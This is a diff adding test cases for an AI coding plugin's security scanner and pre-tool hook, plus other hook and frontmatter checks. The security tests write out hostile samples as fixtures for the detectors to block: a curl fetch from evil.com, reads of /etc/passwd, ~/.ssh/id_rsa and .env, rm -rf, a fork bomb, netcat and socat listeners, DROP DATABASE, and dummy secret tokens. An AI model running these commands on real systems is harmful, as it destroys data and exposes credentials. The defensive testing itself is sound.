@@ -295,6 +295,199 @@ EXIT=$?
 rm -rf "$TMPDIR2"
 
 # ─────────────────────────────────────────────────────────
+header "Security Quickscan — Extended Patterns (v3.5)"
+# ─────────────────────────────────────────────────────────
+
+TMPDIR3=$(mktemp -d)
+
+# Pattern 2: api_key assignment
+cat > "$TMPDIR3/bad-apikey.py" << 'P2EOF'
+api_key = "abcdefghij1234567890"
+P2EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-apikey.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects api_key assignment (exit 2)" || fail "api_key detection" "expected exit 2, got $EXIT"
+
+# Pattern 3: Bearer token
+cat > "$TMPDIR3/bad-bearer.py" << 'P3EOF'
+headers = {"Authorization": "Bearer eyAbcDefGhIjKlMnOpQrStUv"}
+P3EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-bearer.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects Bearer token (exit 2)" || fail "Bearer token detection" "expected exit 2, got $EXIT"
+
+# Pattern 7: Hardcoded passwords
+cat > "$TMPDIR3/bad-password.py" << 'P7EOF'
+password = "supersecret123"
+P7EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-password.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects hardcoded password (exit 2)" || fail "Password detection" "expected exit 2, got $EXIT"
+
+# Pattern 8: Public S3 ACL
+cat > "$TMPDIR3/bad-s3acl.py" << 'P8EOF'
+s3.put_object(Bucket="mybucket", Key="file.txt", ACL="public-read")
+P8EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-s3acl.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects public S3 ACL (exit 2)" || fail "S3 ACL detection" "expected exit 2, got $EXIT"
+
+# Pattern 10: Command substitution in non-shell file
+cat > "$TMPDIR3/bad-cmdsub.py" << 'P10EOF'
+result = "$(cat /etc/passwd)"
+P10EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-cmdsub.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects command substitution in non-shell (exit 2)" || fail "Command substitution detection" "expected exit 2, got $EXIT"
+
+# Pattern 11: Zsh module loading
+cat > "$TMPDIR3/bad-zmod.py" << 'P11EOF'
+os.system("zmodload zsh/net/tcp")
+P11EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-zmod.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects zsh module loading (exit 2)" || fail "Zsh module detection" "expected exit 2, got $EXIT"
+
+# Pattern 12: IFS manipulation in non-shell file
+cat > "$TMPDIR3/bad-ifs.py" << 'P12EOF'
+os.environ["IFS"] = "\n"
+IFS = ":"
+P12EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-ifs.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects IFS manipulation in non-shell (exit 2)" || fail "IFS manipulation detection" "expected exit 2, got $EXIT"
+
+# Pattern 15: /proc environ access
+cat > "$TMPDIR3/bad-procenv.py" << 'P15EOF'
+with open("/proc/self/environ") as f:
+    secrets = f.read()
+P15EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-procenv.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects /proc environ access (exit 2)" || fail "/proc environ detection" "expected exit 2, got $EXIT"
+
+# Pattern 16: rm -rf dangerous paths
+cat > "$TMPDIR3/bad-rmrf.py" << 'P16EOF'
+os.system("rm -rf $HOME/important")
+P16EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-rmrf.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects rm -rf dangerous path (exit 2)" || fail "rm -rf detection" "expected exit 2, got $EXIT"
+
+# Pattern 17: jq @system
+cat > "$TMPDIR3/bad-jqsystem.py" << 'P17EOF'
+cmd = 'jq -n "@system" input.json'
+P17EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-jqsystem.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects jq @system (exit 2)" || fail "jq @system detection" "expected exit 2, got $EXIT"
+
+# Pattern 18: Process substitution in non-shell
+cat > "$TMPDIR3/bad-procsub.py" << 'P18EOF'
+data = "<(curl http://evil.com/payload)"
+P18EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-procsub.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects process substitution in non-shell (exit 2)" || fail "Process substitution detection" "expected exit 2, got $EXIT"
+
+# Pattern 21: Stripe keys (sk_live_*)
+# Build test key dynamically to avoid GitHub push protection false positive
+STRIPE_PREFIX="sk_live_"
+printf 'const stripe = require("stripe")("%s%s")\n' "$STRIPE_PREFIX" "00000000000000000000000000" > "$TMPDIR3/bad-stripe.js"
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-stripe.js\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects Stripe live key (exit 2)" || fail "Stripe key detection" "expected exit 2, got $EXIT"
+
+# Pattern 22: GitHub tokens (ghp_*)
+cat > "$TMPDIR3/bad-ghtoken.js" << 'P22EOF'
+const token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"
+P22EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-ghtoken.js\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects GitHub token (exit 2)" || fail "GitHub token detection" "expected exit 2, got $EXIT"
+
+# Pattern 23: Slack tokens (xoxb-*)
+cat > "$TMPDIR3/bad-slack.js" << 'P23EOF'
+const slack_token = "xoxb-123456789012-abcdefghij"
+P23EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-slack.js\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects Slack token (exit 2)" || fail "Slack token detection" "expected exit 2, got $EXIT"
+
+# Pattern 24: JWT tokens
+cat > "$TMPDIR3/bad-jwt.js" << 'P24EOF'
+const token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature"
+P24EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-jwt.js\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects hardcoded JWT token (exit 2)" || fail "JWT detection" "expected exit 2, got $EXIT"
+
+# Pattern 25: SQL injection with ${} interpolation
+cat > "$TMPDIR3/bad-sqli.js" << 'P25EOF'
+const query = `SELECT * FROM users WHERE id = ${userId}`
+P25EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-sqli.js\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects SQL interpolation injection (exit 2)" || fail "SQL injection detection" "expected exit 2, got $EXIT"
+
+# Pattern 27: document.write
+cat > "$TMPDIR3/bad-docwrite.js" << 'P27EOF'
+document.write("<h1>" + userInput + "</h1>")
+P27EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-docwrite.js\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects document.write (exit 2)" || fail "document.write detection" "expected exit 2, got $EXIT"
+
+# Pattern 29: pickle.loads
+cat > "$TMPDIR3/bad-pickle.py" << 'P29EOF'
+import pickle
+data = pickle.loads(user_data)
+P29EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-pickle.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects pickle.loads (exit 2)" || fail "pickle.loads detection" "expected exit 2, got $EXIT"
+
+# Pattern 30: yaml.load without safe_load
+cat > "$TMPDIR3/bad-yaml.py" << 'P30EOF'
+import yaml
+config = yaml.load(open("config.yml"))
+P30EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-yaml.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects yaml.load without safe_load (exit 2)" || fail "yaml.load detection" "expected exit 2, got $EXIT"
+
+# Pattern 31: subprocess shell=True
+cat > "$TMPDIR3/bad-subprocess.py" << 'P31EOF'
+import subprocess
+subprocess.run(cmd, shell=True)
+P31EOF
+
+OUTPUT=$(echo "{\"session_id\":\"test-001\",\"tool_input\":{\"file_path\":\"$TMPDIR3/bad-subprocess.py\"}}" | "$SCRIPTS/security-quickscan.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "Detects subprocess shell=True (exit 2)" || fail "subprocess shell=True detection" "expected exit 2, got $EXIT"
+
+rm -rf "$TMPDIR3"
+
+# ─────────────────────────────────────────────────────────
 header "PreToolUse Security Hook (functional)"
 # ─────────────────────────────────────────────────────────
 
@@ -317,6 +510,77 @@ EXIT=$?
 OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Edit","tool_input":{"file_path":"foo.txt"}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
 EXIT=$?
 [ $EXIT -eq 0 ] && pass "PreToolUse skips non-Bash tools" || fail "PreToolUse non-Bash" "expected exit 0, got $EXIT"
+
+# ─────────────────────────────────────────────────────────
+header "PreToolUse Security Hook — Extended Checks (v3.5)"
+# ─────────────────────────────────────────────────────────
+
+# Check 3: Destructive git operations
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"git reset --hard HEAD~3"}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks git reset --hard" || fail "PreToolUse git reset --hard" "expected exit 2, got $EXIT"
+
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"git clean -fd"}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks git clean -fd" || fail "PreToolUse git clean -fd" "expected exit 2, got $EXIT"
+
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"git checkout -- ."}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks git checkout -- ." || fail "PreToolUse git checkout -- ." "expected exit 2, got $EXIT"
+
+# Check 5: chmod 777
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"chmod 777 /var/www/html"}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks chmod 777" || fail "PreToolUse chmod 777" "expected exit 2, got $EXIT"
+
+# Check 6: Disk-filling / fork bombs
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"dd if=/dev/zero of=/tmp/fill bs=1M"}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks dd if=/dev/zero" || fail "PreToolUse dd" "expected exit 2, got $EXIT"
+
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":":(){:|:&};:"}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks fork bomb" || fail "PreToolUse fork bomb" "expected exit 2, got $EXIT"
+
+# Check 7: Network exfiltration
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"nc -l 4444"}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks nc -l" || fail "PreToolUse nc" "expected exit 2, got $EXIT"
+
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"ncat -l 8080"}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks ncat -l" || fail "PreToolUse ncat" "expected exit 2, got $EXIT"
+
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"socat TCP-LISTEN:9999 -"}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks socat" || fail "PreToolUse socat" "expected exit 2, got $EXIT"
+
+# Check 8: Credential file access
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"cat .env"}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks cat .env" || fail "PreToolUse cat .env" "expected exit 2, got $EXIT"
+
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"cat ~/.ssh/id_rsa"}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks cat ~/.ssh/id_rsa" || fail "PreToolUse ssh key" "expected exit 2, got $EXIT"
+
+# Check 9: Database DROP operations
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"psql -c \"DROP TABLE users;\""}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks DROP TABLE" || fail "PreToolUse DROP TABLE" "expected exit 2, got $EXIT"
+
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"mysql -e \"DROP DATABASE production;\""}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks DROP DATABASE" || fail "PreToolUse DROP DATABASE" "expected exit 2, got $EXIT"
+
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"psql -c \"TRUNCATE TABLE sessions;\""}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks TRUNCATE TABLE" || fail "PreToolUse TRUNCATE TABLE" "expected exit 2, got $EXIT"
+
+# Check 10: kill -9 -1
+OUTPUT=$(echo '{"session_id":"test-001","tool_name":"Bash","tool_input":{"command":"kill -9 -1"}}' | "$SCRIPTS/pre-tool-security.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 2 ] && pass "PreToolUse blocks kill -9 -1" || fail "PreToolUse kill -9 -1" "expected exit 2, got $EXIT"
 
 # ─────────────────────────────────────────────────────────
 header "Frontmatter Validation (functional)"
@@ -532,6 +796,203 @@ fi
 rm -rf "$WT_TMP"
 
 # ─────────────────────────────────────────────────────────
+header "Cost Tracker Hook (functional)"
+# ─────────────────────────────────────────────────────────
+
+COST_TMP=$(mktemp -d)
+export CLAUDE_PLUGIN_DATA="$COST_TMP"
+export CLAUDE_PLUGIN_ROOT="$PLUGIN_DIR"
+
+# Test: Skill tool creates JSONL entry
+OUTPUT=$(echo '{"session_id":"test-cost-001","tool_name":"Skill","tool_input":{"skill":"vibe:emmet"}}' | "$SCRIPTS/cost-tracker.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 0 ] && pass "cost-tracker exits 0 for Skill tool" || fail "cost-tracker exit" "expected 0, got $EXIT"
+
+if [ -f "$COST_TMP/costs/skill-costs.jsonl" ]; then
+  COUNT=$(wc -l < "$COST_TMP/costs/skill-costs.jsonl")
+  if [ "$COUNT" -ge 1 ]; then
+    if jq -e '.skill == "emmet"' "$COST_TMP/costs/skill-costs.jsonl" >/dev/null 2>&1; then
+      pass "cost-tracker creates JSONL entry with correct skill name"
+    else
+      fail "cost-tracker JSONL content" "skill name not 'emmet'"
+    fi
+  else
+    fail "cost-tracker JSONL" "file empty"
+  fi
+else
+  fail "cost-tracker JSONL" "skill-costs.jsonl not created"
+fi
+
+# Test: non-Skill tool is skipped
+rm -f "$COST_TMP/costs/skill-costs.jsonl"
+echo '{"session_id":"test-cost-001","tool_name":"Bash","tool_input":{"command":"ls"}}' | "$SCRIPTS/cost-tracker.sh" 2>/dev/null
+if [ -f "$COST_TMP/costs/skill-costs.jsonl" ]; then
+  fail "cost-tracker skips non-Skill tools" "file was created for Bash tool"
+else
+  pass "cost-tracker skips non-Skill tools"
+fi
+
+# Test: respects pause flag
+rm -f "$COST_TMP/costs/skill-costs.jsonl"
+touch "/tmp/vibe-paused-test-cost-002"
+echo '{"session_id":"test-cost-002","tool_name":"Skill","tool_input":{"skill":"vibe:heimdall"}}' | "$SCRIPTS/cost-tracker.sh" 2>/dev/null
+if [ -f "$COST_TMP/costs/skill-costs.jsonl" ]; then
+  fail "cost-tracker respects pause flag" "file was created while paused"
+else
+  pass "cost-tracker respects pause flag"
+fi
+rm -f "/tmp/vibe-paused-test-cost-002"
+
+rm -rf "$COST_TMP"
+unset CLAUDE_PLUGIN_DATA
+unset CLAUDE_PLUGIN_ROOT
+
+# ─────────────────────────────────────────────────────────
+header "Auto Dream Hook (functional)"
+# ─────────────────────────────────────────────────────────
+
+DREAM_TMP=$(mktemp -d)
+export CLAUDE_PLUGIN_DATA="$DREAM_TMP"
+
+# Test: first call increments session counter and returns {}
+OUTPUT=$(echo '{"session_id":"test-dream-001"}' | "$SCRIPTS/auto-dream.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 0 ] && pass "auto-dream exits 0" || fail "auto-dream exit" "expected 0, got $EXIT"
+
+if [ -f "$DREAM_TMP/dream/state.json" ]; then
+  SESSIONS=$(jq -r '.sessionsSince' "$DREAM_TMP/dream/state.json" 2>/dev/null)
+  [ "$SESSIONS" -eq 1 ] && pass "auto-dream increments session counter to 1" || fail "auto-dream counter" "expected 1, got $SESSIONS"
+else
+  fail "auto-dream state" "state.json not created"
+fi
+
+# First call should return {} (no consolidation needed)
+if echo "$OUTPUT" | jq -e '.hookSpecificOutput' >/dev/null 2>&1; then
+  fail "auto-dream first call returns {}" "returned consolidation guidance unexpectedly"
+else
+  pass "auto-dream first call returns {} (no consolidation needed)"
+fi
+
+# Test: after enough sessions and corrections, should trigger consolidation
+# Set state to meet thresholds: 4 sessions (next will be 5), old timestamp
+jq -nc '{lastConsolidation: "2020-01-01T00:00:00Z", sessionsSince: 4, totalConsolidations: 0}' > "$DREAM_TMP/dream/state.json"
+# Create enough corrections in queue
+mkdir -p "$DREAM_TMP/learnings"
+for i in 1 2 3; do
+  echo '{"correction":"test '$i'"}' >> "$DREAM_TMP/learnings/queue.jsonl"
+done
+
+OUTPUT=$(echo '{"session_id":"test-dream-002"}' | "$SCRIPTS/auto-dream.sh" 2>&1)
+if echo "$OUTPUT" | jq -e '.hookSpecificOutput.additionalContext' >/dev/null 2>&1; then
+  pass "auto-dream triggers consolidation when thresholds met"
+else
+  fail "auto-dream consolidation" "did not trigger consolidation guidance"
+fi
+
+rm -rf "$DREAM_TMP"
+unset CLAUDE_PLUGIN_DATA
+
+# ─────────────────────────────────────────────────────────
+header "Tips Engine Hook (functional)"
+# ─────────────────────────────────────────────────────────
+
+TIPS_TMP=$(mktemp -d)
+export CLAUDE_PLUGIN_DATA="$TIPS_TMP"
+
+# Test: first session shows welcome tip
+OUTPUT=$(echo '{"session_id":"test-tips-001"}' | "$SCRIPTS/tips-engine.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 0 ] && pass "tips-engine exits 0" || fail "tips-engine exit" "expected 0, got $EXIT"
+
+if echo "$OUTPUT" | jq -e '.hookSpecificOutput.additionalContext' 2>/dev/null | grep -q "Welcome"; then
+  pass "tips-engine shows welcome tip on first session"
+else
+  fail "tips-engine welcome tip" "welcome tip not found in output"
+fi
+
+# Test: second session does not show welcome again (cooldown)
+OUTPUT2=$(echo '{"session_id":"test-tips-002"}' | "$SCRIPTS/tips-engine.sh" 2>&1)
+if echo "$OUTPUT2" | jq -e '.hookSpecificOutput.additionalContext' 2>/dev/null | grep -q "Welcome"; then
+  fail "tips-engine no duplicate welcome" "welcome tip shown on second session"
+else
+  pass "tips-engine no duplicate welcome on second session"
+fi
+
+rm -rf "$TIPS_TMP"
+unset CLAUDE_PLUGIN_DATA
+
+# ─────────────────────────────────────────────────────────
+header "Pre-Compact Save Hook (functional)"
+# ─────────────────────────────────────────────────────────
+
+PCS_TMP=$(mktemp -d)
+export CLAUDE_PLUGIN_DATA="$PCS_TMP"
+
+OUTPUT=$(echo '{"session_id":"test-pcs-001","cwd":"/tmp","transcript_path":"/dev/null"}' | "$SCRIPTS/pre-compact-save.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 0 ] && pass "pre-compact-save exits 0" || fail "pre-compact-save exit" "expected 0, got $EXIT"
+
+if [ -f "$PCS_TMP/session-state.md" ]; then
+  if grep -q "Session State" "$PCS_TMP/session-state.md"; then
+    pass "pre-compact-save creates session-state.md with correct header"
+  else
+    fail "pre-compact-save state file" "missing expected header"
+  fi
+else
+  fail "pre-compact-save state file" "session-state.md not created"
+fi
+
+if [ -f "$PCS_TMP/session-memory.json" ]; then
+  if jq -e '.sessionId == "test-pcs-001"' "$PCS_TMP/session-memory.json" >/dev/null 2>&1; then
+    pass "pre-compact-save creates session-memory.json with correct session ID"
+  else
+    fail "pre-compact-save memory file" "session ID mismatch"
+  fi
+else
+  fail "pre-compact-save memory file" "session-memory.json not created"
+fi
+
+rm -rf "$PCS_TMP"
+unset CLAUDE_PLUGIN_DATA
+
+# ─────────────────────────────────────────────────────────
+header "Post-Edit Lint Hook (functional)"
+# ─────────────────────────────────────────────────────────
+
+LINT_TMP=$(mktemp -d)
+export CLAUDE_PLUGIN_DATA="$LINT_TMP"
+
+# Test: clean file passes (exit 0)
+CLEAN_FILE=$(mktemp --suffix=.js --tmpdir="$LINT_TMP")
+echo 'const x = 1' > "$CLEAN_FILE"
+OUTPUT=$(echo "{\"session_id\":\"test-lint-001\",\"tool_input\":{\"file_path\":\"$CLEAN_FILE\"}}" | "$SCRIPTS/post-edit-lint.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 0 ] && pass "post-edit-lint passes clean file (exit 0)" || fail "post-edit-lint clean file" "expected 0, got $EXIT"
+
+# Test: respects pause flag
+touch "/tmp/vibe-paused-test-lint-002"
+OUTPUT=$(echo "{\"session_id\":\"test-lint-002\",\"tool_input\":{\"file_path\":\"$CLEAN_FILE\"}}" | "$SCRIPTS/post-edit-lint.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 0 ] && pass "post-edit-lint respects pause flag (exit 0)" || fail "post-edit-lint pause" "expected 0, got $EXIT"
+rm -f "/tmp/vibe-paused-test-lint-002"
+
+# Test: missing file passes (exit 0)
+OUTPUT=$(echo '{"session_id":"test-lint-003","tool_input":{"file_path":"/tmp/nonexistent-file-vibe-test.js"}}' | "$SCRIPTS/post-edit-lint.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 0 ] && pass "post-edit-lint passes missing file (exit 0)" || fail "post-edit-lint missing file" "expected 0, got $EXIT"
+
+# Test: unknown extension passes (exit 0)
+UNKNOWN_FILE=$(mktemp --suffix=.xyz --tmpdir="$LINT_TMP")
+echo 'some content' > "$UNKNOWN_FILE"
+OUTPUT=$(echo "{\"session_id\":\"test-lint-004\",\"tool_input\":{\"file_path\":\"$UNKNOWN_FILE\"}}" | "$SCRIPTS/post-edit-lint.sh" 2>&1)
+EXIT=$?
+[ $EXIT -eq 0 ] && pass "post-edit-lint passes unknown extension (exit 0)" || fail "post-edit-lint unknown ext" "expected 0, got $EXIT"
+
+rm -rf "$LINT_TMP"
+rm -f "/tmp/vibe-paused-test-lint-002"
+unset CLAUDE_PLUGIN_DATA
+
+# ─────────────────────────────────────────────────────────
 header "Heimdall Pattern Files (JSON validation)"
 # ─────────────────────────────────────────────────────────
 
@@ -564,6 +1025,159 @@ for skill_dir in "$PLUGIN_DIR"/skills/*/; do
   fi
 done
 pass "Reference files: $FOUND_REFS total across all skills"
+
+# ─────────────────────────────────────────────────────────
+header "Version Consistency"
+# ─────────────────────────────────────────────────────────
+
+PLUGIN_VERSION=$(python3 -c "import json; print(json.load(open('$PLUGIN_DIR/.claude-plugin/plugin.json'))['version'])" 2>/dev/null)
+
+if [ -n "$PLUGIN_VERSION" ]; then
+  # Check CHANGELOG has an entry for the current version
+  if grep -q "^## $PLUGIN_VERSION" "$PLUGIN_DIR/CHANGELOG.md" 2>/dev/null; then
+    pass "CHANGELOG has entry for v$PLUGIN_VERSION"
+  else
+    fail "CHANGELOG entry" "no entry for v$PLUGIN_VERSION in CHANGELOG.md"
+  fi
+else
+  fail "plugin.json version" "could not read version from plugin.json"
+fi
+
+# ─────────────────────────────────────────────────────────
+header "Skill Frontmatter Completeness"
+# ─────────────────────────────────────────────────────────
+
+MINIMAL_SKILLS="pause resume"
+
+for skill in $EXPECTED_SKILLS; do
+  SKILL_FILE="$PLUGIN_DIR/skills/$skill/SKILL.md"
+  if [ -f "$SKILL_FILE" ]; then
+    # description is required for all skills
+    if grep -q "^description:" "$SKILL_FILE"; then
+      pass "skill/$skill has description"
+    else
+      fail "skill/$skill frontmatter" "missing description"
+    fi
+
+    # Skip minimal utility skills for remaining checks
+    if echo "$MINIMAL_SKILLS" | grep -qw "$skill"; then
+      continue
+    fi
+
+    if grep -q "^whenToUse:" "$SKILL_FILE"; then
+      pass "skill/$skill has whenToUse"
+    else
+      fail "skill/$skill frontmatter" "missing whenToUse"
+    fi
+
+    if grep -q "^maxTokenBudget:" "$SKILL_FILE"; then
+      pass "skill/$skill has maxTokenBudget"
+    else
+      fail "skill/$skill frontmatter" "missing maxTokenBudget"
+    fi
+
+    if grep -q "^model:" "$SKILL_FILE" || grep -q "^effort:" "$SKILL_FILE"; then
+      pass "skill/$skill has model or effort"
+    else
+      fail "skill/$skill frontmatter" "missing both model and effort"
+    fi
+  fi
+done
+
+# ─────────────────────────────────────────────────────────
+header "Agent Frontmatter Completeness"
+# ─────────────────────────────────────────────────────────
+
+for agent_file in "$PLUGIN_DIR"/agents/*.md; do
+  agent_name=$(basename "$agent_file" .md)
+
+  if grep -qE "^model: (opus|sonnet|haiku)" "$agent_file"; then
+    pass "agent/$agent_name has model"
+  else
+    fail "agent/$agent_name frontmatter" "missing or invalid model (expected opus, sonnet, or haiku)"
+  fi
+
+  if grep -q "^memoryScope:" "$agent_file"; then
+    pass "agent/$agent_name has memoryScope"
+  else
+    fail "agent/$agent_name frontmatter" "missing memoryScope"
+  fi
+
+  if grep -q "^snapshotEnabled:" "$agent_file"; then
+    pass "agent/$agent_name has snapshotEnabled"
+  else
+    fail "agent/$agent_name frontmatter" "missing snapshotEnabled"
+  fi
+done
+
+# ─────────────────────────────────────────────────────────
+header "Hooks Cross-Reference"
+# ─────────────────────────────────────────────────────────
+
+HOOK_SCRIPTS=$(python3 -c "
+import json, re
+data = json.load(open('$PLUGIN_DIR/hooks/hooks.json'))
+for event, matchers in data.get('hooks', {}).items():
+    for matcher in matchers:
+        for hook in matcher.get('hooks', []):
+            cmd = hook.get('command', '')
+            m = re.search(r'/scripts/([^\"]+)', cmd)
+            if m:
+                print(m.group(1))
+" 2>/dev/null | sort -u)
+
+if [ -z "$HOOK_SCRIPTS" ]; then
+  fail "hooks.json parse" "could not extract script paths from hooks.json"
+else
+  for script_name in $HOOK_SCRIPTS; do
+    if [ -f "$PLUGIN_DIR/scripts/$script_name" ]; then
+      pass "hooks.json ref: scripts/$script_name exists"
+    else
+      fail "hooks.json ref" "scripts/$script_name referenced but not found"
+    fi
+  done
+fi
+
+# ─────────────────────────────────────────────────────────
+header "Correction Capture — Extended Languages"
+# ─────────────────────────────────────────────────────────
+
+TEST_DATA_LANG="/tmp/vibe-test-correction-lang-$$"
